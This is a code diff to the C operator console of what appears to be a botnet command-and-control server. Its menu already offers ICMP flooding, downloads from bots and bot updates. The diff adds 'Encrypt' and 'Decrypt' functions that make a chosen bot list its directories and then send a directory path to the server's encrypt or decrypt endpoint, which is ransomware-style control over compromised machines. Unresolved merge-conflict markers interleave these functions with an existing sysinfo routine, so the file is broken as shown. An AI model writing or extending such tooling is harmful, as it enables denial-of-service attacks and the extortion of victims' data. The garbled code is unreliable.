@@ -25,7 +25,7 @@ static size_t write_callback(void *contents, size_t size, size_t nmemb, void *us
 }
 
 // Menu options
-#define NUM_OPTIONS 9
+#define NUM_OPTIONS 11
 const char *menu_options[NUM_OPTIONS] = {
     "Display Bots",
     "Download from bot",
@@ -34,6 +34,8 @@ const char *menu_options[NUM_OPTIONS] = {
     "Get Botfile's Last Lines",
     "Update bots",
     "ICMP Flooding",
+    "Encrypt",
+    "Decrypt",
     "Get sysinfo",
     "Quit"
 };
@@ -159,7 +161,14 @@ void *interactive_menu() {
                         icmp_flood();
                         break;
                     case 7:
+                        encrypt_file_on_bot();
+                        break;
+                    case 8:
+                        decrypt_file_on_bot();
+                        break;
+                    case 9:
                         sysinfo_bots();
+                        break;
                 }
             }
             choice = -1; // Reset choice
@@ -1850,6 +1859,7 @@ void update_bots() {
                     cJSON *bot = filtered_bots[i];
                     cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
                     cJSON *status_obj = cJSON_GetObjectItem(bot, "status");
+
                     if (cJSON_IsString(id_obj) && cJSON_IsString(status_obj)) {
                         if (i == highlight) {
                             attron(A_BOLD | COLOR_PAIR(1));
@@ -1862,17 +1872,23 @@ void update_bots() {
                         }
                     }
                 }
+
                 refresh();
                 ch = getch();
-                if (ch == 'q') break;
-                else if (ch == KEY_UP) highlight = (highlight - 1 + filtered_count) % filtered_count;
-                else if (ch == KEY_DOWN) highlight = (highlight + 1) % filtered_count;
-                else if (ch == '\n') {
+                if (ch == 'q') {
+                    break; // Cancel adding a bot
+                } else if (ch == KEY_UP) {
+                    highlight = (highlight - 1 + filtered_count) % filtered_count; // Move up
+                } else if (ch == KEY_DOWN) {
+                    highlight = (highlight + 1) % filtered_count; // Move down
+                } else if (ch == '\n') { // Enter key
+                    // Add the selected bot to the list
                     cJSON *selected_bot = filtered_bots[highlight];
                     cJSON *id_obj = cJSON_GetObjectItem(selected_bot, "id");
                     if (cJSON_IsString(id_obj)) {
-                        if (strlen(selected_bots) > 0)
+                        if (strlen(selected_bots) > 0) {
                             strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
+                        }
                         strncat(selected_bots, id_obj->valuestring, sizeof(selected_bots) - strlen(selected_bots) - 1);
                     }
                     break;
@@ -1924,17 +1940,23 @@ void update_bots() {
                 }
                 refresh();
                 ch = getch();
-                if (ch == 'q') break;
-                else if (ch == KEY_UP) highlight = (highlight - 1 + bot_count) % bot_count;
-                else if (ch == KEY_DOWN) highlight = (highlight + 1) % bot_count;
-                else if (ch == '\n') {
-                    for (int i = highlight; i < bot_count - 1; i++)
+                if (ch == 'q') {
+                    break; // Cancel removing a bot
+                } else if (ch == KEY_UP) {
+                    highlight = (highlight - 1 + bot_count) % bot_count; // Move up
+                } else if (ch == KEY_DOWN) {
+                    highlight = (highlight + 1) % bot_count; // Move down
+                } else if (ch == '\n') { // Enter key
+                    // Remove the selected bot from the list
+                    for (int i = highlight; i < bot_count - 1; i++) {
                         bot_list[i] = bot_list[i + 1];
+                    }
                     bot_count--;
                     selected_bots[0] = '\0';
                     for (int i = 0; i < bot_count; i++) {
-                        if (i > 0)
+                        if (i > 0) {
                             strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
+                        }
                         strncat(selected_bots, bot_list[i], sizeof(selected_bots) - strlen(selected_bots) - 1);
                     }
                     break;
@@ -2117,6 +2139,12 @@ void icmp_flood() {
     refresh(); getch();
 }
 
+<<<<<<< src/server/console.c
+void encrypt_file_on_bot() {
+    // --- 1. Select a bot ---
+    CURL *curl = curl_easy_init();
+    if (!curl) return;
+=======
 void sysinfo_bots(){
     CURL *curl = curl_easy_init();
     if (!curl) {
@@ -2129,10 +2157,14 @@ void sysinfo_bots(){
         return;
     }
 
+>>>>>>> src/server/console.c
     char response[4096] = {0};
     curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/bots");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+<<<<<<< src/server/console.c
+    if (curl_easy_perform(curl) != CURLE_OK) {
+=======
 
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
@@ -2142,6 +2174,7 @@ void sysinfo_bots(){
         attroff(A_BOLD | COLOR_PAIR(4));
         refresh();
         getch();
+>>>>>>> src/server/console.c
         curl_easy_cleanup(curl);
         return;
     }
@@ -2149,6 +2182,38 @@ void sysinfo_bots(){
 
     cJSON *parsed_json = cJSON_Parse(response);
     if (!parsed_json || !cJSON_IsArray(parsed_json)) {
+<<<<<<< src/server/console.c
+        if (parsed_json) cJSON_Delete(parsed_json);
+        return;
+    }
+    int total_bots = cJSON_GetArraySize(parsed_json);
+    if (total_bots == 0) {
+        cJSON_Delete(parsed_json);
+        return;
+    }
+    int highlight = 0, ch;
+    char selected_bot[256] = "None";
+    while (1) {
+        clear();
+        mvprintw(0, 0, "Select a Bot (Press 'q' to cancel):");
+        for (int i = 0; i < total_bots; i++) {
+            cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
+            cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+            if (cJSON_IsString(id_obj)) {
+                if (i == highlight) {
+                    attron(A_BOLD | COLOR_PAIR(1));
+                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    attroff(A_BOLD | COLOR_PAIR(1));
+                    strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
+                    selected_bot[sizeof(selected_bot) - 1] = '\0';
+                } else {
+                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                }
+            }
+        }
+        mvprintw(LINES - 1, 0, "Selected Bot: %s | Press 'q' to cancel", selected_bot);
+        refresh();
+=======
         clear();
         attron(A_BOLD | COLOR_PAIR(4));
         print_wrapped(4, 0, "Failed to parse JSON response.");
@@ -2191,10 +2256,196 @@ void sysinfo_bots(){
 
         refresh();
 
+>>>>>>> src/server/console.c
         ch = getch();
         if (ch == 'q') {
             cJSON_Delete(parsed_json);
             return;
+<<<<<<< src/server/console.c
+        } else if (ch == KEY_UP) {
+            highlight = (highlight - 1 + total_bots) % total_bots;
+        } else if (ch == KEY_DOWN) {
+            highlight = (highlight + 1) % total_bots;
+        } else if (ch == '\n') {
+            cJSON *selected_bot_obj = cJSON_GetArrayItem(parsed_json, highlight);
+            cJSON *id_obj = cJSON_GetObjectItem(selected_bot_obj, "id");
+            if (cJSON_IsString(id_obj)) {
+                strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
+                selected_bot[sizeof(selected_bot) - 1] = '\0';
+            }
+            break;
+        }
+    }
+    cJSON_Delete(parsed_json);
+
+    // --- 2. Directory navigation ---
+    char current_dir[PATH_MAX] = "/";
+    while (1) {
+        memset(response, 0, sizeof(response));
+        char post_data[512];
+        snprintf(post_data, sizeof(post_data),
+                 "bot_ids=%s&cmd_id=0&program=ls&params=-la %s&delay=0&expected_code=0",
+                 selected_bot, current_dir);
+
+        curl = curl_easy_init();
+        if (!curl) return;
+        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/command");
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+
+        cJSON *response_json = cJSON_Parse(response);
+        if (!response_json) return;
+        cJSON *results = cJSON_GetObjectItem(response_json, "results");
+        cJSON *first_result = cJSON_GetArrayItem(results, 0);
+        cJSON *output = cJSON_GetObjectItem(first_result, "output");
+        cJSON_DeleteItemFromArray(output, 0); // Remove the first line
+
+        // Gather directories
+        int dir_highlight = 0, start_index = 0;
+        int total_dirs = 0;
+        int dir_indices[1024];
+        for (int i = 0; i < cJSON_GetArraySize(output); ++i) {
+            cJSON *item = cJSON_GetArrayItem(output, i);
+            if (cJSON_IsString(item)) {
+                char permissions[11] = {0};
+                sscanf(item->valuestring, "%10s", permissions);
+                if (permissions[0] == 'd') {
+                    dir_indices[total_dirs++] = i;
+                }
+            }
+        }
+        int max_y, max_x;
+        getmaxyx(stdscr, max_y, max_x);
+        int visible_lines = max_y - 3;
+
+        while (1) {
+            clear();
+            mvprintw(0, 0, "Navigate: Enter to go in, C to confirm, q to cancel");
+            for (int i = 0; i < visible_lines && (start_index + i) < total_dirs; i++) {
+                int idx = dir_indices[start_index + i];
+                cJSON *item = cJSON_GetArrayItem(output, idx);
+                const char *line = item->valuestring;
+                const char *dir_name = strrchr(line, ' ');
+                if (dir_name) dir_name++;
+                else dir_name = line;
+                char display_name[512];
+                snprintf(display_name, sizeof(display_name), "%s", dir_name);
+                display_name[strcspn(display_name, "\n\r")] = '\0';
+
+                if ((start_index + i) == dir_highlight) {
+                    attron(A_BOLD | COLOR_PAIR(1));
+                    mvprintw(i + 1, 0, "> %s/", display_name);
+                    attroff(A_BOLD | COLOR_PAIR(1));
+                } else {
+                    mvprintw(i + 1, 0, "  %s/", display_name);
+                }
+            }
+            attron(A_BOLD | COLOR_PAIR(2));
+            mvprintw(max_y - 2, 0, "Current path: %s", current_dir);
+            attroff(A_BOLD | COLOR_PAIR(2));
+            mvprintw(max_y - 1, 0, "Use Arrow Keys | Enter: go in | C: confirm | q: cancel");
+            refresh();
+
+            int ch2 = getch();
+            if (ch2 == 'q') {
+                cJSON_Delete(response_json);
+                return;
+            } else if (ch2 == KEY_UP) {
+                if (dir_highlight > 0) {
+                    dir_highlight--;
+                    if (dir_highlight < start_index) start_index--;
+                }
+            } else if (ch2 == KEY_DOWN) {
+                if (dir_highlight < total_dirs - 1) {
+                    dir_highlight++;
+                    if (dir_highlight >= start_index + visible_lines) start_index++;
+                }
+            } else if (ch2 == '\n') {
+                int idx = dir_indices[dir_highlight];
+                cJSON *item = cJSON_GetArrayItem(output, idx);
+                const char *line = item->valuestring;
+                const char *dir_name = strrchr(line, ' ');
+                if (dir_name) dir_name++;
+                else dir_name = line;
+                char trimmed_name[512];
+                snprintf(trimmed_name, sizeof(trimmed_name), "%s", dir_name);
+                trimmed_name[strcspn(trimmed_name, "\n\r")] = '\0';
+
+                if (strcmp(trimmed_name, ".") == 0) continue;
+                if (strcmp(trimmed_name, "..") == 0) {
+                    if (strcmp(current_dir, "/") == 0) {
+                        // Already at root
+                    } else {
+                        char parent_dir[PATH_MAX];
+                        realpath(current_dir, parent_dir);
+                        char *slash = strrchr(parent_dir, '/');
+                        if (slash && slash != parent_dir) *slash = '\0';
+                        else strcpy(parent_dir, "/");
+                        strncpy(current_dir, parent_dir, sizeof(current_dir) - 1);
+                        current_dir[sizeof(current_dir) - 1] = '\0';
+                    }
+                    break;
+                }
+                // Go into subdirectory
+                if (strcmp(current_dir, "/") == 0)
+                    snprintf(current_dir, sizeof(current_dir), "/%s", trimmed_name);
+                else
+                    snprintf(current_dir + strlen(current_dir), sizeof(current_dir) - strlen(current_dir), "/%s", trimmed_name);
+                break;
+            } else if (ch2 == 'C' || ch2 == 'c') {
+                // Confirm selection
+                clear();
+                print_wrapped(2, 0, "Encrypt directory: %s ? (y/n)", current_dir);
+                refresh();
+                int confirm = getch();
+                if (confirm == 'y' || confirm == 'Y') {
+                    // Send to API
+                    char post_data[1024];
+                    snprintf(post_data, sizeof(post_data), "bot_id=%s&file_path=%s", selected_bot, current_dir);
+                    CURL *enc_curl = curl_easy_init();
+                    if (!enc_curl) {
+                        cJSON_Delete(response_json);
+                        return;
+                    }
+                    memset(response, 0, sizeof(response));
+                    curl_easy_setopt(enc_curl, CURLOPT_URL, "http://127.0.0.1:8000/api/encrypt");
+                    curl_easy_setopt(enc_curl, CURLOPT_POST, 1L);
+                    curl_easy_setopt(enc_curl, CURLOPT_POSTFIELDS, post_data);
+                    curl_easy_setopt(enc_curl, CURLOPT_WRITEFUNCTION, write_callback);
+                    curl_easy_setopt(enc_curl, CURLOPT_WRITEDATA, response);
+                    curl_easy_perform(enc_curl);
+                    curl_easy_cleanup(enc_curl);
+
+                    clear();
+                    attron(A_BOLD | COLOR_PAIR(3));
+                    print_wrapped(0, 0, "Encryption request sent.");
+                    print_wrapped(2, 0, "Server response: %s", response);
+                    attroff(A_BOLD | COLOR_PAIR(3));
+                    refresh();
+                    getch();
+                    cJSON_Delete(response_json);
+                    return;
+                }
+            }
+        }
+        cJSON_Delete(response_json);
+    }
+}
+
+void decrypt_file_on_bot() {
+    // --- 1. Select a bot ---
+    CURL *curl = curl_easy_init();
+    if (!curl) return;
+    char response[4096] = {0};
+    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/bots");
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    if (curl_easy_perform(curl) != CURLE_OK) {
+=======
         } else if (ch == 'A' || ch == 'a') {
             // Add a bot
             // Parse selected_bots into array
@@ -2374,11 +2625,223 @@ void sysinfo_bots(){
         print_wrapped(8, 0, "Failed to send sysinfo command: %s", curl_easy_strerror(res));
         attroff(A_BOLD | COLOR_PAIR(4));
         refresh();
+>>>>>>> src/server/console.c
         curl_easy_cleanup(curl);
         return;
     }
     curl_easy_cleanup(curl);
 
+<<<<<<< src/server/console.c
+    cJSON *parsed_json = cJSON_Parse(response);
+    if (!parsed_json || !cJSON_IsArray(parsed_json)) {
+        if (parsed_json) cJSON_Delete(parsed_json);
+        return;
+    }
+    int total_bots = cJSON_GetArraySize(parsed_json);
+    if (total_bots == 0) {
+        cJSON_Delete(parsed_json);
+        return;
+    }
+    int highlight = 0, ch;
+    char selected_bot[256] = "None";
+    while (1) {
+        clear();
+        mvprintw(0, 0, "Select a Bot (Press 'q' to cancel):");
+        for (int i = 0; i < total_bots; i++) {
+            cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
+            cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+            if (cJSON_IsString(id_obj)) {
+                if (i == highlight) {
+                    attron(A_BOLD | COLOR_PAIR(1));
+                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    attroff(A_BOLD | COLOR_PAIR(1));
+                    strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
+                    selected_bot[sizeof(selected_bot) - 1] = '\0';
+                } else {
+                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                }
+            }
+        }
+        mvprintw(LINES - 1, 0, "Selected Bot: %s | Press 'q' to cancel", selected_bot);
+        refresh();
+        ch = getch();
+        if (ch == 'q') {
+            cJSON_Delete(parsed_json);
+            return;
+        } else if (ch == KEY_UP) {
+            highlight = (highlight - 1 + total_bots) % total_bots;
+        } else if (ch == KEY_DOWN) {
+            highlight = (highlight + 1) % total_bots;
+        } else if (ch == '\n') {
+            cJSON *selected_bot_obj = cJSON_GetArrayItem(parsed_json, highlight);
+            cJSON *id_obj = cJSON_GetObjectItem(selected_bot_obj, "id");
+            if (cJSON_IsString(id_obj)) {
+                strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
+                selected_bot[sizeof(selected_bot) - 1] = '\0';
+            }
+            break;
+        }
+    }
+    cJSON_Delete(parsed_json);
+
+    // --- 2. Directory navigation ---
+    char current_dir[PATH_MAX] = "/";
+    while (1) {
+        memset(response, 0, sizeof(response));
+        char post_data[512];
+        snprintf(post_data, sizeof(post_data),
+                 "bot_ids=%s&cmd_id=0&program=ls&params=-la %s&delay=0&expected_code=0",
+                 selected_bot, current_dir);
+
+        curl = curl_easy_init();
+        if (!curl) return;
+        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/command");
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+
+        cJSON *response_json = cJSON_Parse(response);
+        if (!response_json) return;
+        cJSON *results = cJSON_GetObjectItem(response_json, "results");
+        cJSON *first_result = cJSON_GetArrayItem(results, 0);
+        cJSON *output = cJSON_GetObjectItem(first_result, "output");
+        cJSON_DeleteItemFromArray(output, 0); // Remove the first line
+
+        // Gather directories
+        int dir_highlight = 0, start_index = 0;
+        int total_dirs = 0;
+        int dir_indices[1024];
+        for (int i = 0; i < cJSON_GetArraySize(output); ++i) {
+            cJSON *item = cJSON_GetArrayItem(output, i);
+            if (cJSON_IsString(item)) {
+                char permissions[11] = {0};
+                sscanf(item->valuestring, "%10s", permissions);
+                if (permissions[0] == 'd') {
+                    dir_indices[total_dirs++] = i;
+                }
+            }
+        }
+        int max_y, max_x;
+        getmaxyx(stdscr, max_y, max_x);
+        int visible_lines = max_y - 3;
+
+        while (1) {
+            clear();
+            mvprintw(0, 0, "Select a directory:");
+            for (int i = 0; i < visible_lines && (start_index + i) < total_dirs; i++) {
+                int idx = dir_indices[start_index + i];
+                cJSON *item = cJSON_GetArrayItem(output, idx);
+                const char *line = item->valuestring;
+                const char *dir_name = strrchr(line, ' ');
+                if (dir_name) dir_name++;
+                else dir_name = line;
+                char display_name[512];
+                snprintf(display_name, sizeof(display_name), "%s", dir_name);
+                display_name[strcspn(display_name, "\n\r")] = '\0';
+
+                if ((start_index + i) == dir_highlight) {
+                    attron(A_BOLD | COLOR_PAIR(1));
+                    mvprintw(i + 1, 0, "> %s/", display_name);
+                    attroff(A_BOLD | COLOR_PAIR(1));
+                } else {
+                    mvprintw(i + 1, 0, "  %s/", display_name);
+                }
+            }
+            attron(A_BOLD | COLOR_PAIR(2));
+            mvprintw(max_y - 2, 0, "Current path: %s", current_dir);
+            attroff(A_BOLD | COLOR_PAIR(2));
+            mvprintw(max_y - 1, 0, "Use Arrow Keys | C: confirm | q: cancel");
+            refresh();
+
+            int ch2 = getch();
+            if (ch2 == 'q') {
+                cJSON_Delete(response_json);
+                return;
+            } else if (ch2 == KEY_UP) {
+                if (dir_highlight > 0) {
+                    dir_highlight--;
+                    if (dir_highlight < start_index) start_index--;
+                }
+            } else if (ch2 == KEY_DOWN) {
+                if (dir_highlight < total_dirs - 1) {
+                    dir_highlight++;
+                    if (dir_highlight >= start_index + visible_lines) start_index++;
+                }
+            } else if (ch2 == '\n') {
+                int idx = dir_indices[dir_highlight];
+                cJSON *item = cJSON_GetArrayItem(output, idx);
+                const char *line = item->valuestring;
+                const char *dir_name = strrchr(line, ' ');
+                if (dir_name) dir_name++;
+                else dir_name = line;
+                char trimmed_name[512];
+                snprintf(trimmed_name, sizeof(trimmed_name), "%s", dir_name);
+                trimmed_name[strcspn(trimmed_name, "\n\r")] = '\0';
+
+                if (strcmp(trimmed_name, ".") == 0) continue;
+                if (strcmp(trimmed_name, "..") == 0) {
+                    if (strcmp(current_dir, "/") == 0) {
+                        // Already at root
+                    } else {
+                        char parent_dir[PATH_MAX];
+                        realpath(current_dir, parent_dir);
+                        char *slash = strrchr(parent_dir, '/');
+                        if (slash && slash != parent_dir) *slash = '\0';
+                        else strcpy(parent_dir, "/");
+                        strncpy(current_dir, parent_dir, sizeof(current_dir) - 1);
+                        current_dir[sizeof(current_dir) - 1] = '\0';
+                    }
+                    break;
+                }
+                // Go into subdirectory
+                if (strcmp(current_dir, "/") == 0)
+                    snprintf(current_dir, sizeof(current_dir), "/%s", trimmed_name);
+                else
+                    snprintf(current_dir + strlen(current_dir), sizeof(current_dir) - strlen(current_dir), "/%s", trimmed_name);
+                break;
+            } else if (ch2 == 'C' || ch2 == 'c') {
+                // Confirm selection
+                clear();
+                print_wrapped(2, 0, "Decrypt directory: %s ? (y/n)", current_dir);
+                refresh();
+                int confirm = getch();
+                if (confirm == 'y' || confirm == 'Y') {
+                    // Send to API
+                    char post_data[1024];
+                    snprintf(post_data, sizeof(post_data), "bot_id=%s&file_path=%s", selected_bot, current_dir);
+                    CURL *dec_curl = curl_easy_init();
+                    if (!dec_curl) {
+                        cJSON_Delete(response_json);
+                        return;
+                    }
+                    memset(response, 0, sizeof(response));
+                    curl_easy_setopt(dec_curl, CURLOPT_URL, "http://127.0.0.1:8000/api/decrypt");
+                    curl_easy_setopt(dec_curl, CURLOPT_POST, 1L);
+                    curl_easy_setopt(dec_curl, CURLOPT_POSTFIELDS, post_data);
+                    curl_easy_setopt(dec_curl, CURLOPT_WRITEFUNCTION, write_callback);
+                    curl_easy_setopt(dec_curl, CURLOPT_WRITEDATA, response);
+                    curl_easy_perform(dec_curl);
+                    curl_easy_cleanup(dec_curl);
+
+                    clear();
+                    attron(A_BOLD | COLOR_PAIR(3));
+                    print_wrapped(0, 0, "Decryption request sent.");
+                    print_wrapped(2, 0, "Server response: %s", response);
+                    attroff(A_BOLD | COLOR_PAIR(3));
+                    refresh();
+                    getch();
+                    cJSON_Delete(response_json);
+                    return;
+                }
+            }
+        }
+        cJSON_Delete(response_json);
+    }
+}
+=======
     // Display the server's response
     attron(A_BOLD | COLOR_PAIR(3));
     print_wrapped(9, 0, "Sysinfo sent. Server response:");
@@ -2388,3 +2851,4 @@ void sysinfo_bots(){
     refresh();
     getch();
 }
+>>>>>>> src/server/console.c
